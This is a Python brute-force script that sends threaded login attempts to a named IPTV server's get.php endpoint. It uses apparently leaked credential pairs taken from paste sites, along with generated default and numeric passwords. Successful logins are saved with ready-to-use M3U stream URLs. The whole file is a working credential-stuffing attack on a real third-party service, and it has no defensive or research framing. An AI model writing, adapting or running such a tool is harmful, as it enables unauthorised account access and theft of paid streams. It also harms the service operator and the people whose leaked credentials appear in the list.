#!/usr/bin/env python3
"""
Brute Force v2 - Specific patterns from IPTV leaks
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

SERVER = "filex.me"
PORT = 80
BASE_URL = f"http://{SERVER}:{PORT}/get.php"

found = []
tested = 0

def test(user, pwd):
    global tested
    try:
        r = requests.get(BASE_URL, params={"username": user, "password": pwd, "type": "m3u"}, timeout=8)
        tested += 1
        text = r.text
        
        # Valid response check
        if r.status_code == 200 and len(text) > 50:
            if "invalid" not in text.lower() and "error" not in text.lower() and "not found" not in text.lower():
                if "#EXT" in text or "stream" in text.lower() or len(text) > 200:
                    return True, user, pwd, len(text)
        return False, user, pwd, 0
    except:
        return False, user, pwd, 0

# Patterns from IPTV leak sites
credentials = [
    # From justpaste.it search results
    ("Ghosia104", "pathan104"),
    ("Ghosia105", "pathan105"),
    ("Ghosia106", "pathan106"),
    ("Ghosia107", "pathan107"),
    ("Ghosia108", "pathan108"),
    ("Ghosia109", "pathan109"),
    ("Ghosia110", "pathan110"),
    ("Ghosia", "Ghosia"),
    ("ghosia", "ghosia"),
    # Family patterns
    ("FamilyIPTV", "FamilyIPTV"),
    ("family", "family"),
    ("FAMILY", "FAMILY"),
    # Premium patterns
    ("premium", "premium"),
    ("Premium", "Premium"),
    ("PREMIUM", "PREMIUM"),
    ("vip", "vip"),
    ("VIP", "VIP"),
    ("gold", "gold"),
    ("GOLD", "GOLD"),
    # Star patterns
    ("star", "star"),
    ("starlive", "starlive"),
    ("startv", "startv"),
    ("StarLive", "StarLive"),
    ("StarTV", "StarTV"),
    # IPTV patterns
    ("iptv", "iptv"),
    ("IPTV", "IPTV"),
    ("Iptv", "Iptv"),
    ("iptv2024", "iptv2024"),
    ("iptv2025", "iptv2025"),
    ("iptv2026", "iptv2026"),
    # Stream patterns
    ("stream", "stream"),
    ("Stream", "Stream"),
    ("STREAM", "STREAM"),
    ("live", "live"),
    ("Live", "Live"),
    ("LIVE", "LIVE"),
    # Test patterns
    ("test", "test"),
    ("Test", "Test"),
    ("TEST", "TEST"),
    ("demo", "demo"),
    ("Demo", "Demo"),
    ("DEMO", "DEMO"),
    ("trial", "trial"),
    ("Trial", "Trial"),
    ("TRIAL", "TRIAL"),
    # Admin patterns
    ("admin", "admin"),
    ("Admin", "Admin"),
    ("ADMIN", "ADMIN"),
    ("admin123", "admin123"),
    ("Admin123", "Admin123"),
    # User patterns
    ("user", "user"),
    ("User", "User"),
    ("USER", "USER"),
    ("guest", "guest"),
    ("Guest", "Guest"),
    # Numeric patterns (common in IPTV panels)
    ("1000", "1000"),
    ("2000", "2000"),
    ("3000", "3000"),
    ("4000", "4000"),
    ("5000", "5000"),
    ("1234", "1234"),
    ("12345", "12345"),
    ("123456", "123456"),
    ("1234567", "1234567"),
    ("12345678", "12345678"),
    ("123456789", "123456789"),
    ("0000", "0000"),
    ("00000", "00000"),
    ("000000", "000000"),
    ("1111", "1111"),
    ("11111", "11111"),
    ("111111", "111111"),
    ("8888", "8888"),
    ("88888", "88888"),
    ("888888", "888888"),
    ("9999", "9999"),
    ("99999", "99999"),
    ("999999", "999999"),
    # Random account patterns
    ("82526697", "23082022"),  # From fastream
    ("82526698", "23082022"),
    ("82526699", "23082022"),
    # Date patterns
    ("2024", "2024"),
    ("2025", "2025"),
    ("2026", "2026"),
    ("012024", "012024"),
    ("022024", "022024"),
    ("032024", "032024"),
    # Random strings
    ("qwerty", "qwerty"),
    ("asdfgh", "asdfgh"),
    ("zxcvbn", "zxcvbn"),
    ("abcdef", "abcdef"),
    ("abc123", "abc123"),
    # Pakistan/India patterns (common in IPTV)
    ("pakistan", "pakistan"),
    ("india", "india"),
    ("pak", "pak"),
    ("ind", "ind"),
    # Arabic patterns
    ("arabic", "arabic"),
    ("arab", "arab"),
    # Sports patterns
    ("sports", "sports"),
    ("sport", "sport"),
    ("bein", "bein"),
    ("Bein", "Bein"),
    ("BEIN", "BEIN"),
]

# Generate more numeric patterns
for i in range(1, 100):
    credentials.append((str(i), str(i)))
    credentials.append((f"{i:04d}", f"{i:04d}"))
    credentials.append((f"{i:06d}", f"{i:06d}"))

# Generate sequential patterns
for prefix in ["star", "live", "iptv", "test", "demo", "user", "admin"]:
    for i in range(1, 20):
        credentials.append((f"{prefix}{i}", f"{prefix}{i}"))
        credentials.append((f"{prefix}{i}", f"{prefix}123"))
        credentials.append((f"{prefix}{i}", "123456"))

print(f"[*] Testing {len(credentials)} credentials on {SERVER}:{PORT}")
print("-" * 50)

with ThreadPoolExecutor(max_workers=15) as executor:
    futures = {executor.submit(test, u, p): (u, p) for u, p in credentials}
    
    for future in as_completed(futures):
        success, u, p, size = future.result()
        if success:
            print(f"\n[+] FOUND: {u}:{p} ({size} bytes)")
            found.append((u, p, size))
            with open("/home/z/my-project/download/filex_found.txt", "a") as f:
                f.write(f"=== FOUND ===\nUser: {u}\nPass: {p}\nSize: {size}\nM3U: http://{SERVER}:{PORT}/get.php?username={u}&password={p}&type=m3u_plus\n\n")

print(f"\n[*] Tested: {tested} | Found: {len(found)}")

for u, p, s in found:
    print(f"  {u}:{p}")
